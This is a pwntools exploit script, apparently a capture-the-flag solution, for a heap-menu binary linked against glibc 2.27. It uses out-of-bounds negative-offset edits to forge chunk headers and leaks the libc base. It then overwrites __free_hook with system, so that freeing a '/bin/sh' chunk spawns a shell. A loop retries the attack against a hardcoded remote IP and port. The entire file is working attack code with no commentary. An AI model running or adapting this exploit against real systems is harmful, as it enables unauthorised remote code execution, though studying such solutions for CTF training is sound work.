from pwn import*
context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('Your choice: ',str(ch))
def new(index,size):
	menu(1)
	p.sendlineafter('Index:',str(index))
	p.sendlineafter('Size: ',str(size))
def edit(index,offset,size,content):
	menu(2)
	p.sendlineafter('Index: ',str(index))
	p.sendlineafter('Offset: ',str(offset))
	p.sendlineafter('Size: ',str(size))
	p.sendafter('Content: ',content)
def free(index):
	menu(3)
	p.sendlineafter('Index: ',str(index))
def openfile():
	menu(4)
def closefile():
	menu(5)
while True:
	p = process('./main')
	libc =ELF('./libc-2.27.so.bak')
	p = remote('106.14.214.3',1912)
	try:
		for i in range(8):
			new(i,0xF0)
		openfile()
		closefile()
		#gdb.attach(p,'b *0x555555554D7E')
		edit(0,-0x10,0x100,p64(0) + p64(0x501))
		free(0)
		new(0,0xF0)
		new(8,0xF0)
		new(9,0xF0)
		new(10,0xF0)
		new(11,0xF0)
		new(12,0xF0)
		free(5)
		free(6)
		edit(7,-0x100,0x100,'\xC0\xAA')
		new(6,0xF0)
		new(5,0xF0)
		free(7)
		free(6)
		free(4)
		free(3)
		free(2)
		free(1)
		free(0)
		edit(12,-0x7FE8,0x7FE8,p64(0x101) + 'FMYY' + '\x00'*(0xF0-4) + p64(0x100) + p64(0x21) + '\x00'*0x18 + p64(0x21))
		free(5)
		edit(12,-0x7FF0,0x7FF8,'F'*0x10)
		menu(5)
		libc_base = u64(p.recvuntil('\x7F',timeout=0.2)[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x10 - 0x60
		log.info('LIBC:\t' + hex(libc_base))
		free_hook = libc_base + libc.sym['__free_hook']
		system = libc_base + libc.sym['system']
		new(7,0xF0)
		free(8)
		new(0,0xF0)
		edit(0,0,0x10,p64(free_hook))
		new(8,0xF0)
		edit(8,0,0x10,'/bin/sh\x00')
		new(1,0xF0)
		edit(1,0,0x10,p64(system))
		free(8)
		break
	except:
		p.close()
		continue
p.interactive()
